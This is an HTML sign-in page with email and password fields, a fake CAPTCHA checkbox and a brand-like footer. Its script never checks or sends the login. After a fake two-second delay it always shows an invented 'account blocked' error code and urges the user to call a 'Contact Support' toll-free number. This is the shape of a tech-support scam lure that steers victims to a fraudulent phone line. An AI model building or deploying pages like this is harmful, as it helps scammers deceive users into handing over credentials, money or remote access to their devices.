<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Page</title>
    <style>
        /* General Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
        }

        .container {
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .logo {
            text-align: left;
            margin-bottom: 30px;
        }

        .logo img {
            width: 30px;
            height: 30px;
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            text-align: left;
            font-weight: bold;
        }

        label {
            display: block;
            text-align: left;
            margin-bottom: 10px;
            font-size: 1rem;
            color: #333;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 48px;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 1rem;
        }

        .remember {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 15px;
            font-size: 0.9rem;
            text-align: left;
        }

        .forgot-password {
            text-align: left;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #000;
            font-size: 0.9rem;
            text-decoration: underline;
        }

        /* reCAPTCHA Box */
        .captcha {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 20px;
            height: 70px;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding-left: 10px;
            background-color: #f9f9f9;
        }

        /* Sign In Button with Spinner */
        .btn-container {
            position: relative;
        }

        button {
            width: 100%;
            padding: 15px;
            font-size: 1rem;
            color: #fff;
            background-color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #333;
        }

        /* Spinner */
        .spinner {
            display: none;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border: 2px solid #f3f3f3;
            border-top: 2px solid #fff;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            100% { transform: translate(-50%, -50%) rotate(360deg); }
        }

        /* Error Message */
        .error-message {
            display: none;
            margin-bottom: 10px;
            color: red;
            font-size: 1rem;
            font-weight: bold;
            text-align: left;
        }

        .footer {
            font-size: 0.8rem;
            color: #888;
            margin-top: 20px;
            text-align: center;
        }

        .footer a {
            color: #000;
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <!-- Container -->
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="https://via.placeholder.com/30" alt="Logo">
        </div>

        <!-- Sign In Title -->
        <h1>Sign in</h1>

        <!-- Sign In Form -->
        <form id="signin-form">
            <!-- Email Input -->
            <label for="email">Email address</label>
            <input type="email" id="email" name="email">

            <!-- Remember Email -->
            <div class="remember">
                <input type="checkbox" id="remember">
                <label for="remember">Remember my email address</label>
            </div>

            <!-- Password Input -->
            <label for="password">Password</label>
            <input type="password" id="password" name="password">

            <!-- Error Message Above Forgot Password -->
            <div class="error-message" id="error-message">Error code: 0X0047800 <br> Your account has been blocked due to some suspicious login attempts. <br>Contact Support : <a href="tel:18335317046">+1-833-531-7046</a></div>

            <!-- Forgot Password -->
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>

            <!-- reCAPTCHA -->
            <div class="captcha">
                <input type="checkbox" id="captcha">
                <label for="captcha">I'm not a robot</label>
            </div>

            <!-- Sign In Button -->
            <div class="btn-container">
                <button type="button" id="sign-in-btn">Sign in</button>
                <div class="spinner" id="spinner"></div>
            </div>
        </form>

        <!-- Footer -->
        <div class="footer">
            Trust is Our Productâ„¢<br>
            For trademarks and patents, please see our <a href="#">Legal Notice</a>.
        </div>
    </div>

    <!-- JavaScript -->
    <script>
        document.getElementById("sign-in-btn").addEventListener("click", function() {
            // Get elements
            const spinner = document.getElementById("spinner");
            const errorMessage = document.getElementById("error-message");
            const button = document.getElementById("sign-in-btn");

            // Show spinner on the button
            spinner.style.display = "block";
            button.style.color = "transparent"; // Hide button text

            // Hide the error message if visible
            errorMessage.style.display = "none";

            // Simulate API delay
            setTimeout(() => {
                // Hide spinner and restore button text
                spinner.style.display = "none";
                button.style.color = "#fff";

                // Show error message above Forgot Password
                errorMessage.style.display = "block";
            }, 2000);
        });
    </script>
</body>
</html>
